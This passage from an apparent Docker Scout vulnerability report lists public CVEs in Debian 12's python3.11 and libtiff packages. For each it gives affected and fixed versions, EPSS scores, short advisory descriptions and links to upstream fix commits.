Regression Fixed by: https://github.com/python/cpython/commit/4762b365406a8cf026a4a4ddcae34c28a41c3de9 (v3.11.10)
Introduced by: https://github.com/python/cpython/commit/0b6f6c82b51b7071d88f48abb3192bf3dc2a2d24 (v3.3.0a4)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-9287?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u5"><img alt="low : CVE--2024--9287" src="https://img.shields.io/badge/CVE--2024--9287-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in the CPython `venv` module and CLI where path names provided when creating a virtual environment were not quoted properly, allowing the creator to inject commands into virtual environment "activation" scripts (ie "source venv/bin/activate"). This means that attacker-controlled virtual environments are able to run commands when the virtual environment is activated. Virtual environments which are not created by an attacker or which aren't activated before being used (ie "./venv/bin/python") are not affected.

---
- python3.13 3.13.1-1
- python3.12 3.12.8-1
- python3.11 <removed>
[bookworm] - python3.11 3.11.2-6+deb12u5
- python3.9 <removed>
- python2.7 <not-affected> (Vulnerable code not present)
- pypy3 7.3.17+dfsg-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1089117)
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u3
https://mail.python.org/archives/list/security-announce@python.org/thread/RSPJ2B5JL22FG3TKUJ7D7DQ4N5JRRBZL/
https://github.com/python/cpython/issues/124651
https://github.com/python/cpython/pull/124712
https://github.com/python/cpython/commit/e52095a0c1005a87eed2276af7a1f2f66e2b6483 (v3.13.1)
https://github.com/python/cpython/commit/8450b2482586857d689b6658f08de9c8179af7db (v3.12.8)
https://github.com/python/cpython/commit/ae961ae94bf19c8f8c7fbea3d1c25cc55ce8ae97 (v3.11.11)
https://github.com/python/cpython/commit/633555735a023d3e4d92ba31da35b1205f9ecbd7 (v3.9.21)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-8088?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u3"><img alt="low : CVE--2024--8088" src="https://img.shields.io/badge/CVE--2024--8088-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.332%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a HIGH severity vulnerability affecting the CPython "zipfile" module affecting "zipfile.Path". Note that the more common API "zipfile.ZipFile" class is unaffected.      When iterating over names of entries in a zip archive (for example, methods of "zipfile.Path" like "namelist()", "iterdir()", etc) the process can be put into an infinite loop with a maliciously crafted zip archive. This defect applies when reading only metadata or extracting the contents of the zip archive. Programs that are not handling user-controlled zip archives are not affected.

---
- python3.13 3.13.0~rc2-1
- python3.12 3.12.6-1
- python3.11 <removed>
- python3.9 <removed>
- python2.7 <not-affected> (zipfile.Path introduced in v3.8)
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
[bullseye] - pypy3 <not-affected> (zipfile.Path introduced in v3.8; embedding 3.6.9)
https://mail.python.org/archives/list/security-announce@python.org/thread/GNFCKVI4TCATKQLALJ5SN4L4CSPSMILU/
https://github.com/python/cpython/pull/122906
https://github.com/python/cpython/issues/122905
https://github.com/python/cpython/commit/8c7348939d8a3ecd79d630075f6be1b0c5b41f64 (v3.13.0rc2)
https://github.com/python/cpython/commit/dcc5182f27c1500006a1ef78e10613bb45788dea (v3.12.6)
https://github.com/python/cpython/commit/795f2597a4be988e2bb19b69ff9958e981cb894e (v3.11.10)
https://github.com/python/cpython/commit/e0264a61119d551658d9445af38323ba94fc16db (v3.10.15)
Regression (cf. #1080245): https://github.com/python/cpython/issues/123270
Regression fixed by: https://github.com/python/cpython/commit/fc0b8259e693caa8400fa8b6ac1e494e47ea7798 (v3.11.10)
Regression fixed by: https://github.com/python/cpython/commit/962055268ed4f2ca1d717bfc8b6385de50a23ab7 (v3.9.20)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-4032?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u3"><img alt="low : CVE--2024--4032" src="https://img.shields.io/badge/CVE--2024--4032-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.127%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The “ipaddress” module contained incorrect information about whether certain IPv4 and IPv6 addresses were designated as “globally reachable” or “private”. This affected the is_private and is_global properties of the ipaddress.IPv4Address, ipaddress.IPv4Network, ipaddress.IPv6Address, and ipaddress.IPv6Network classes, where values wouldn’t be returned in accordance with the latest information from the IANA Special-Purpose Address Registries.  CPython 3.12.4 and 3.13.0a6 contain updated information from these registries and thus have the intended behavior.

---
- python3.13 <not-affected> (Fixed before initial upload to Debian unstable)
- python3.12 3.12.4-1
- python3.11 <removed>
- python3.9 <removed>
- python3.7 <removed>
- python2.7 <not-affected> (ipaddress module added in 3.3)
- pypy3 7.3.18+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
[bullseye] - pypy3 <postponed> (Minor issue)
https://github.com/advisories/GHSA-mh6q-v4mp-2cc7
https://github.com/python/cpython/issues/113171
https://github.com/python/cpython/pull/113179
https://github.com/python/cpython/commit/ba431579efdcbaed7a96f2ac4ea0775879a332fb (v3.11.10)
https://github.com/python/cpython/commit/22adf29da8d99933ffed8647d3e0726edd16f7f8 (v3.9.20)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-0397?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u3"><img alt="low : CVE--2024--0397" src="https://img.shields.io/badge/CVE--2024--0397-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.384%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A defect was discovered in the Python “ssl” module where there is a memory race condition with the ssl.SSLContext methods “cert_store_stats()” and “get_ca_certs()”. The race condition can be triggered if the methods are called at the same time as certificates are loaded into the SSLContext, such as during the TLS handshake with a certificate directory configured. This issue is fixed in CPython 3.10.14, 3.11.9, 3.12.3, and 3.13.0a5.

---
- pypy3 7.3.16+dfsg-1
[bookworm] - pypy3 <no-dsa> (Minor issue)
[bullseye] - pypy3 <postponed> (Minor issue, hard-to-trigger race condition)
- python3.13 <not-affected> (Fixed before initial upload to Debian unstable)
- python3.12 3.12.3-1
- python3.11 3.11.9-1
- python3.9 <removed>
- python3.7 <removed>
- python2.7 <removed>
[bullseye] - python2.7 <ignored> (Unsupported in Bullseye, only included to build a few applications)
https://github.com/advisories/GHSA-xhf3-pp4q-gxh5
https://github.com/python/cpython/issues/114572
https://github.com/python/cpython/pull/114573
https://github.com/python/cpython/commit/542f3272f56f31ed04e74c40635a913fbc12d286 (v3.12.3)
https://github.com/python/cpython/commit/01c37f1d0714f5822d34063ca7180b595abf589d (v3.11.9)
https://github.com/python/cpython/commit/b228655c227b2ca298a8ffac44d14ce3d22f6faa (3.9-branch)
https://github.com/pypy/pypy/commit/8035017515660b3f19a5aec8b28237b57fc5d6dd (release-pypy3.9-v7.3.16)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6597?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u2"><img alt="low : CVE--2023--6597" src="https://img.shields.io/badge/CVE--2023--6597-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.071%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was found in the CPython `tempfile.TemporaryDirectory` class affecting versions 3.12.1, 3.11.7, 3.10.13, 3.9.18, and 3.8.18 and prior.  The tempfile.TemporaryDirectory class would dereference symlinks during cleanup of permissions-related errors. This means users which can run privileged programs are potentially able to modify permissions of files referenced by symlinks in some circumstances.

---
- python3.12 3.12.1-1
- python3.11 3.11.8-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1070135)
[bookworm] - python3.11 3.11.2-6+deb12u2
- python3.10 <removed>
- python3.9 <removed>
- python3.7 <removed>
- python2.7 <not-affected> (tempfile.TemporaryDirectory added in 3.2)
- pypy3 7.3.13+dfsg-1
[bookworm] - pypy3 7.3.11+dfsg-2+deb12u2
[buster] - pypy3 <no-dsa> (Minor issue)
https://github.com/python/cpython/pull/99930
https://github.com/python/cpython/issues/91133
https://github.com/python/cpython/commit/6ceb8aeda504b079fef7a57b8d81472f15cdd9a5 (v3.12.1)
https://github.com/python/cpython/commit/5585334d772b253a01a6730e8202ffb1607c3d25 (v3.11.8)
https://github.com/python/cpython/commit/8eaeefe49d179ca4908d052745e3bb8b6f238f82 (v3.10.14)
https://github.com/python/cpython/commit/d54e22a669ae6e987199bb5d2c69bb5a46b0083b (v3.9.19)
https://mail.python.org/archives/list/security-announce@python.org/thread/Q5C6ATFC67K53XFV4KE45325S7NS62LD/
Introduced by: https://github.com/python/cpython/commit/e9b51c0ad81da1da11ae65840ac8b50a8521373c (v3.8.0b1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-41105?s=debian&n=python3.11&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.11.2-6%2Bdeb12u2"><img alt="low : CVE--2023--41105" src="https://img.shields.io/badge/CVE--2023--41105-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.11.2-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.11.2-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.370%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Python 3.11 through 3.11.4. If a path containing '\0' bytes is passed to os.path.normpath(), the path will be truncated unexpectedly at the first '\0' byte. There are plausible cases in which an application would have rejected a filename for security reasons in Python 3.10.x or earlier, but that filename is no longer rejected in Python 3.11.x.

---
- python3.12 3.12.0~rc1-2
- python3.11 3.11.5-1
[bookworm] - python3.11 3.11.2-6+deb12u2
- python3.10 <not-affected> (Vulnerable code introduced in 3.11.y)
- python3.9 <not-affected> (Vulnerable code introduced in 3.11.y)
- python3.7 <not-affected> (Vulnerable code introduced in 3.11.y)
- python2.7 <not-affected> (Vulnerable code introduced in 3.11.y)
https://github.com/python/cpython/issues/106242
https://github.com/python/cpython/pull/107983
Backport for 3.12: https://github.com/python/cpython/pull/107981
Backport for 3.11: https://github.com/python/cpython/pull/107982

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 8" src="https://img.shields.io/badge/M-8-fbb552"/> <img alt="low: 12" src="https://img.shields.io/badge/L-12-fce1a9"/> <img alt="unspecified: 2" src="https://img.shields.io/badge/U-2-lightgrey"/><strong>tiff</strong> <code>4.5.0-6</code> (deb)</summary>

<small><code>pkg:deb/debian/tiff@4.5.0-6?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-9900?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u3"><img alt="high : CVE--2025--9900" src="https://img.shields.io/badge/CVE--2025--9900-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in Libtiff. This vulnerability is a "write-what-where" condition, triggered when the library processes a specially crafted TIFF image file.  By providing an abnormally large image height value in the file's metadata, an attacker can trick the library into writing attacker-controlled color data to an arbitrary memory location. This memory corruption can be exploited to cause a denial of service (application crash) or to achieve arbitrary code execution with the permissions of the user.

---
- tiff 4.7.1-1
https://gitlab.com/libtiff/libtiff/-/issues/704
https://gitlab.com/libtiff/libtiff/-/merge_requests/732
https://gitlab.com/libtiff/libtiff/-/commit/3e0dcf0ec651638b2bd849b2e6f3124b36890d99 (v4.7.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-7006?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="high : CVE--2024--7006" src="https://img.shields.io/badge/CVE--2024--7006-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.121%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A null pointer dereference flaw was found in Libtiff via `tif_dirinfo.c`. This issue may allow an attacker to trigger memory allocation failures through certain means, such as restricting the heap space size or injecting faults, causing a segmentation fault. This can cause an application crash, eventually leading to a denial of service.

---
- tiff 4.5.1+git230720-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1078648)
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/merge_requests/559
https://gitlab.com/libtiff/libtiff/-/issues/624
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/818fb8ce881cf839fbc710f6690aadb992aa0f9e

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52356?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="high : CVE--2023--52356" src="https://img.shields.io/badge/CVE--2023--52356-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.417%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A segment fault (SEGV) flaw was found in libtiff that could be triggered by passing a crafted tiff file to the TIFFReadRGBATileExt() API. This flaw allows a remote attacker to cause a heap-buffer overflow, leading to a denial of service.

---
- tiff 4.5.1+git230720-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1061524)
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/issues/622
https://gitlab.com/libtiff/libtiff/-/merge_requests/546
https://gitlab.com/libtiff/libtiff/-/commit/51558511bdbbcffdce534db21dbaf5d54b31638a

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-41175?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u1"><img alt="medium : CVE--2023--41175" src="https://img.shields.io/badge/CVE--2023--41175-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.260%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in libtiff due to multiple potential integer overflows in raw2tiff.c. This flaw allows remote attackers to cause a denial of service or possibly execute an arbitrary code via a crafted tiff image, which triggers a heap-based buffer overflow.

---
- tiff 4.5.1+git230720-1
https://gitlab.com/libtiff/libtiff/-/issues/592
https://gitlab.com/libtiff/libtiff/-/commit/6e2dac5f904496d127c92ddc4e56eccfca25c2ee
https://bugzilla.redhat.com/show_bug.cgi?id=2235264

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-40745?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u1"><img alt="medium : CVE--2023--40745" src="https://img.shields.io/badge/CVE--2023--40745-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.259%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

LibTIFF is vulnerable to an integer overflow. This flaw allows remote attackers to cause a denial of service (application crash) or possibly execute an arbitrary code via a crafted tiff image, which triggers a heap-based buffer overflow.

---
- tiff 4.5.1+git230720-1
https://gitlab.com/libtiff/libtiff/-/commit/4fc16f649fa2875d5c388cf2edc295510a247ee5
https://gitlab.com/libtiff/libtiff/-/issues/591
https://bugzilla.redhat.com/show_bug.cgi?id=2235265

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-3618?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="medium : CVE--2023--3618" src="https://img.shields.io/badge/CVE--2023--3618-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.215%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in libtiff. A specially crafted tiff file can lead to a segmentation fault due to a buffer overflow in the Fax3Encode function in libtiff/tif_fax3.c, resulting in a denial of service.

---
- tiff 4.5.1~rc3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1040945)
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/issues/529
https://gitlab.com/libtiff/libtiff/-/commit/b5c7d4c4e03333ac16b5cfb11acaaeaa493334f8 (v4.5.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-3576?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u1"><img alt="medium : CVE--2023--3576" src="https://img.shields.io/badge/CVE--2023--3576-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A memory leak flaw was found in Libtiff's tiffcrop utility. This issue occurs when tiffcrop operates on a TIFF image file, allowing an attacker to pass a crafted TIFF image file to tiffcrop utility, which causes this memory leak issue, resulting an application crash, eventually leading to a denial of service.

---
- tiff 4.5.1~rc3-1
https://gitlab.com/libtiff/libtiff/-/merge_requests/475
Fixed by: https://gitlab.com/libtiff/libtiff/-/commit/1d5b1181c980090a6518f11e61a18b0e268bf31a (v4.5.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-2908?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="medium : CVE--2023--2908" src="https://img.shields.io/badge/CVE--2023--2908-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A null pointer dereference issue was found in Libtiff's tif_dir.c file. This issue may allow an attacker to pass a crafted TIFF image file to the tiffcp utility which triggers a runtime error that causes undefined behavior. This will result in an application crash, eventually leading to a denial of service.

---
- tiff 4.5.1~rc3-1
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/merge_requests/479
https://gitlab.com/libtiff/libtiff/-/commit/9bd48f0dbd64fb94dc2b5b05238fde0bfdd4ff3f (v4.5.1rc1)
Introduced by the fix for CVE-2022-3599/CVE-2022-4645/CVE-2023-30086/CVE-2023-30774:
https://gitlab.com/libtiff/libtiff/-/commit/e813112545942107551433d61afd16ac094ff246 (v4.5.0rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-26966?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="medium : CVE--2023--26966" src="https://img.shields.io/badge/CVE--2023--26966-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libtiff 4.5.0 is vulnerable to Buffer Overflow in uv_encode() when libtiff reads a corrupted little-endian TIFF file and specifies the output to be big-endian.

---
- tiff 4.5.1~rc3-1
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/issues/530
https://gitlab.com/libtiff/libtiff/-/merge_requests/473
https://gitlab.com/libtiff/libtiff/-/commit/b0e1c25dd1d065200c8d8f59ad0afe014861a1b9 (v4.5.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-26965?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="medium : CVE--2023--26965" src="https://img.shields.io/badge/CVE--2023--26965-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.009%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

loadImage() in tools/tiffcrop.c in LibTIFF through 4.5.0 has a heap-based use after free via a crafted TIFF image.

---
- tiff 4.5.1~rc3-1
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/merge_requests/472
https://gitlab.com/libtiff/libtiff/-/commit/ec8ef90c1f573c9eb1f17d6a056aa0015f184acf (v4.5.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-25433?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.5.0-6%2Bdeb12u2"><img alt="medium : CVE--2023--25433" src="https://img.shields.io/badge/CVE--2023--25433-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.5.0-6+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>4.5.0-6+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libtiff 4.5.0 is vulnerable to Buffer Overflow via /libtiff/tools/tiffcrop.c:8499. Incorrect updating of buffer size after rotateImage() in tiffcrop cause heap-buffer-overflow and SEGV.

---
- tiff 4.5.1~rc3-1
[bookworm] - tiff 4.5.0-6+deb12u2
https://gitlab.com/libtiff/libtiff/-/issues/520
https://gitlab.com/libtiff/libtiff/-/commit/9c22495e5eeeae9e00a1596720c969656bb8d678 (v4.5.1rc1)
https://gitlab.com/libtiff/libtiff/-/commit/688012dca2c39033aa2dc7bcea9796787cfd1b44 (v4.5.1rc1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9165?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--9165" src="https://img.shields.io/badge/CVE--2025--9165-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw has been found in LibTIFF 4.7.0. This affects the function _TIFFmallocExt/_TIFFCheckRealloc/TIFFHashSetNew/InitCCITTFax3 of the file tools/tiffcmp.c of the component tiffcmp. Executing manipulation can lead to memory leak. The attack is restricted to local execution. This attack is characterized by high complexity. It is indicated that the exploitability is difficult. The exploit has been published and may be used. There is ongoing doubt regarding the real existence of this vulnerability. This patch is called ed141286a37f6e5ddafb5069347ff5d587e7a4e0. It is best practice to apply a patch to resolve this issue. A researcher disputes the security impact of this issue, because "this is a memory leak on a command line tool that is about to exit anyway". In the reply the project maintainer declares this issue as "a simple 'bug' when leaving the command line tool and (...) not a security issue at all".

---
- tiff 4.7.0-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111878; unimportant)
[trixie] - tiff 4.7.0-3+deb13u1
https://gitlab.com/libtiff/libtiff/-/issues/728
https://gitlab.com/libtiff/libtiff/-/merge_requests/747
https://gitlab.com/libtiff/libtiff/-/commit/ed141286a37f6e5ddafb5069347ff5d587e7a4e0
Memory leak in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8961?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--8961" src="https://img.shields.io/badge/CVE--2025--8961-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A weakness has been identified in LibTIFF 4.7.0. This affects the function main of the file tiffcrop.c of the component tiffcrop. Executing manipulation can lead to memory corruption. The attack can only be executed locally. The exploit has been made available to the public and could be exploited.

---
- tiff 4.7.0-5 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111317; unimportant)
[trixie] - tiff 4.7.0-3+deb13u1
https://gitlab.com/libtiff/libtiff/-/issues/721
https://gitlab.com/libtiff/libtiff/-/commit/0ac97aa7a5bffddd88f7cdbe517264e9db3f5bd5
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8851?s=debian&n=tiff&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D4.5.0-6%2Bdeb12u3"><img alt="low : CVE--2025--8851" src="https://img.shields.io/badge/CVE--2025--8851-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=4.5.0-6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.017%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in LibTIFF up to 4.5.1. Affected by this issue is the function readSeparateStripsetoBuffer of the file tools/tiffcrop.c of the component tiffcrop. The manipulation leads to stack-based buffer overflow. Local access is required to approach this attack. The patch is identified as 8a7a48d7a645992ca83062b3a1873c951661e2b3. It is recommended to apply a patch to fix this issue.

---
- tiff 4.7.0-1 (unimportant)
https://gitlab.com/libtiff/libtiff/-/commit/8a7a48d7a645992ca83062b3a1873c951661e2b3 (v4.7.0rc1)
Crash in CLI tool, no security impact

</blockquote>
</details>

